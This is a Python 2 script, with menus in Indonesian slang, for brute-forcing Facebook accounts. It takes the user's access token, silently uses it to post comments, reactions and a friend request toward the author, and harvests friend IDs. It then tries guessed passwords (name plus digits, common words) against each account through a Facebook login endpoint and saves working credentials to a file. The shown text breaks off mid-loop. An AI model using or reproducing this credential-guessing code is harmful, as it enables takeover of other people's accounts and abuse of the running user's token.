#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
    import mechanize
except ImportError:
    os.system("pip2 install mechanize")
try:
    import requests
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 mulung.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m.', '\033[1;92m .', '\033[1;95m .', '\033[1;91m .']):
        if done:
            break
        sys.stdout.write('\r\033[1;93mTumgu ea ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
    print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
    os.sys.exit()
    
    
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
#########LOGO#########
logo = """
\033[1;97m@@@@       @@@@@  \033[1;91m***** \033[1;97m@@@@@@                             
\033[1;97m@@@@     @@@@@  \033[1;91m*****     \033[1;97m@@@@@@                           
\033[1;97m@@@@   @@@@@ \033[1;91m******         \033[1;97m@@@@@                          
\033[1;97m@@@@ @@@@@ \033[1;91m******          \033[1;97m@@@@@                           
\033[1;97m@@@@@@@@@@@ \033[1;91m****** \033[1;97m@@@@@@@@@@@@                            
\033[1;97m@@@@@   @@@@@ \033[1;91m******     @@@@@                             
\033[1;97m@@@@   \033[1;91m* \033[1;97m@@@@@@ \033[1;91m******    \033[1;97m@@@@@                            
\033[1;97m@@@@   \033[1;91m*** \033[1;97m@@@@@  \033[1;91m*****    \033[1;97m@@@@@  

KAUM \033[1;91mKUSAM \033[1;97mREPORTING

mulung.py                                                                                                              
\033[1;94m──────────────────────────────────────────────────
\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mAuthor   \033[1;91m: \033[1;96mRizky Rasata
\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mRecoder  \033[1;91m: \033[1;96mMuiSzz
\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mFacebook \033[1;91m: \033[1;96mFacebook.com/gwmuisz"""

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

###### MASUK ######
def masuk():
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print "*hanya tersedia lomgin lewat token smlurt"
    print "\033[1;97m{\033[1;92m01\033[1;97m} Lomgin token"
    print "\033[1;97m{\033[1;92m02\033[1;97m} Mahwu token"
    print "\033[1;97m{\033[1;91m00\033[1;97m} Keluar"
    print 50* "\033[1;94m─"
    pilih_masuk()

def pilih_masuk():
    msuk = raw_input("\033[1;90mmahwu yang mana ? \033[91m:\033[1;92m ")
    if msuk =="":
        print"\033[1;97m[\033[1;91m!\033[1;97m] Gaada opsi itu smlur"
        pilih_masuk()
    elif msuk =="1" or msuk =="01":
        tokenz()
    elif msuk =="2"or msuk =="03":
        ambil_link()
    elif msuk =="0" or msuk =="00":
        keluar()
    else:
        print"\033[1;97m[\033[1;91m!\033[1;97m] Gaada opsi itu smlur"
        pilih_masuk()
            
#####LOGIN_TOKENZ#####
def tokenz():
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    toket = raw_input("\033[1;97m{\033[1;95m?\033[1;97m} Token \033[1;91m:\033[1;92m ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        zedd = open("login.txt", 'w')
        zedd.write(toket)
        zedd.close()
        print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Lomgin sukses mint'
        print 'abis ini bakal auto komen ke post ane ea bmjir'
        os.system('xdg-open https://m.facebook.com/gwmuisz')
        bot_komen()
    except KeyError:
        print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mTomkennya gabener nih anjink"
        time.sleep(1.7)
        masuk()    
##### AMBIL LINK #####
def ambil_link():
    os.system("clear")
    print logo
    print 50* "\033[1;94m─"
    jalan("\033[1;92mGabole make Akun Facebook Lama...")
    jalan("\033[1;92mWajib make Akun Facebook Baru ...")
    jalan("\033[1;92mKalo make fb lama + ga cp, lo make apk aja, tp gwe gaada ...")
    jalan("\033[1;92mkalo scnya eror , pukulian patur aja kata epen mah...")
    jalan ("\033[1;96mMulai...")
    os.system('xdg-open https://ambiltoken.herokuapp.com')
    raw_input("\n[ balik? ]")
    masuk()
    
###### BOT KOMEN #######
def bot_komen():
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;97m[!] Tokennya gabener nih asw"
        os.system('rm -rf login.txt')
    una = ('100014670276545')
    kom = ('sayang kok')
    reac = ('LOVE')
    post = ('970058923493108')
    post2 = ('970058923493108')
    kom2 = ('sayang muis')
    reac2 = ('LOVE')
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
    requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
    menu()

###### MENU #######
def menu():
    os.system('clear')
    try:
        toket = open('login.txt','r').read()
    except IOError:
        print "{!} Tokennya gabener nih asw !"
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print"\033[1;96m[!] \033[1;91mTokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print"{!} Tidak ada koneksi"
        keluar()
    os.system("clear")
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m NAMA\033[1;90m    =>\033[1;92m " +nama
    print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m USER ID\033[1;90m =>\033[1;92m " + id
    print 50* "\033[1;94m─"
    print "\033[1;97m{"+warni+"01\033[1;97m}"+warna+" Mulung ID Dari Teman/Publik"
    print "\033[1;97m{"+warni+"02\033[1;97m}"+warna+" Mulung ID Dari Postingan Grup/Teman"
    print "\033[1;97m{"+warni+"03\033[1;97m}"+warna+" Mulung ID Dari Total Followers"
    print "\033[1;97m{"+warni+"04\033[1;97m}"+warna+" Nyari ID Menggunakan Username"
    print "\033[1;97m{"+warni+"05\033[1;97m}"+warna+" Perbarui Script"
    print "\033[1;97m{\033[1;91m00\033[1;97m}"+warna+" Keluar"
    print 50* "\033[1;94m─"
    pilih()
    
######PILIH######
def pilih():
    unikers = raw_input("\033[1;92mmahwu yang mana ? \033[91m:\033[1;92m ")
    if unikers =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih()
    elif unikers =="1" or unikers =="01":
        crack_teman()
    elif unikers =="2" or unikers =="02":
        crack_likes()
    elif unikers =="3" or unikers =="03":
        crack_follow()
    elif unikers =="4" or unikers =="04":
        user_id()
    elif unikers =="5" or unikers =="05":
        perbarui()
    elif unikers =="0" or unikers =="00":
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih()
        
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
    os.system("clear")
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{"+warna+"01\033[1;97m}"+warni+" Mulung ID Indonesia"
    print "\033[1;97m{"+warna+"02\033[1;97m}"+warni+" Mulung ID Bangladesh"
    print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Mulung ID Usa"
    print "\033[1;97m{"+warna+"04\033[1;97m}"+warni+" Mulung ID Pakistan"
    print "\033[1;97m{\033[1;91m00\033[1;97m}"+warni+" balik?"
    print 50* "\033[1;94m─"
    pilih_teman()
    
######PILIH######
def pilih_teman():
    univ = raw_input(""+warna+"mahwu yang mana ? \033[91m:\033[1;92m ")
    if univ =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_teman()
    elif univ =="1" or univ =="01":
        crack_indo()
    elif univ =="2" or univ =="02":
        crack_bangla()
    elif univ =="3" or univ =="03":
        crack_usa()
    elif univ =="4" or univ =="04":
        crack_pakis()
    elif univ =="5" or univ =="05":
        univ()
    elif univ =="0" or univ =="00":
        menu()
    else:
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_teman()
        
##### Mulung INDONESIA #####
def crack_indo():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;96m[!] \x1b[1;91mTokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{\033[1;93m01\033[1;97m} Mulung Dari Daftar Teman"
    print "\033[1;97m{\033[1;93m02\033[1;97m} Mulung Dari Publik/Teman"
    print "\033[1;97m{\033[1;93m03\033[1;97m} Mulung Dari File"
    print "\033[1;97m{\033[1;91m00\033[1;97m} balik?"
    print 50* "\033[1;94m─"
    pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
    teak = raw_input("\033[1;93mmahwu yang mana ? \033[91m:\033[1;92m ")
    if teak =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_indo()
    elif teak =="1" or teak =="01":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;93m●●● \033[1;97mMulung INDONESIA \033[1;93m●●●")
        print 50* "\033[1;94m─"
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    elif teak =="2" or teak =="02":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;93m●●● \033[1;97mMulung INDONESIA \033[1;93m●●●")
        print 50* "\033[1;94m─"
        idt = raw_input("\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mID Publik/Teman \033[1;91m:\033[1;92m ")
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print"\033[1;97m{\033[1;93m●\033[1;97m}\033[1;93m Nama \033[1;91m:\033[1;92m "+sp["name"]
        except KeyError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
            raw_input("\n\033[1;93m{\033[1;97m<balik?>\033[1;93m}")
            crack_indo()
        except requests.exceptions.ConnectionError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
            keluar()
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif teak =="3" or teak =="03":
        os.system('clear')
        print logo
        try:
            print 50* "\033[1;94m─"
            print ("             \033[1;93m●●● \033[1;97mMulung INDONESIA \033[1;93m●●●")
            print 50* "\033[1;94m─"
            idlist = raw_input('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mNama File\033[1;91m :\033[1;92m ')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
            raw_input('\n\033[1;92m[ \033[1;97mbalik? \033[1;92m]')
        except IOError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
            raw_input("\n\033[1;93m{\033[1;97m<balik?>\033[1;93m}")
            crack_indo()
    elif teak =="0" or teak =="00":
        menu()
    else:
        print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Gaada opsi itu smlur"
        pilih_indo()
    
    print "\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mStop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mSedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN INDONESIA #####
    def main(arg):
        global cekpoint,oks
        zowe = arg
        try:
            sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S \033[1;97m"+str(len(zowe)))));sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/indo.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos1
                    cek = open("done/indo.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/indo.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos2
                            cek = open("done/indo.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/indo.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos3
                                    cek = open("done/indo.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = ('sayang')
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/indo.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos4
                                            cek = open("done/indo.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = ('bangsat')
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/indo.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos5
                                                    cek = open("done/indo.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = ('anjing')
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
                                                        oke = open("done/indo.txt", "a")
                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos6
                                                            cek = open("done/indo.txt", "a")
                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                        else:
                                                            bos7 = ('kontol')
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            ko = json.load(data)
                                                            if 'access_token' in ko:
                                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
                                                                oke = open("done/indo.txt", "a")
                                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                oke.close()
                                                                oks.append(zowe)
                                                            else:
                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                    print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                                                    print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos7
                                                                    cek = open("done/indo.txt", "a")
                                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(zowe)
                                                                else:
                                                                    bos8 = j['last_name'].lower()+'123'
                                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    ko = json.load(data)
                                                                    if 'access_token' in ko:
                                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
                                                                        oke = open("done/indo.txt", "a")
                                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                        oke.close()
                                                                        oks.append(zowe)
                                                                    else:
                                                                        if 'www.facebook.com' in ko['error_msg']:
                                                                            print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
                                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
                                                                            print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos8
                                                                            cek = open("done/indo.txt", "a")
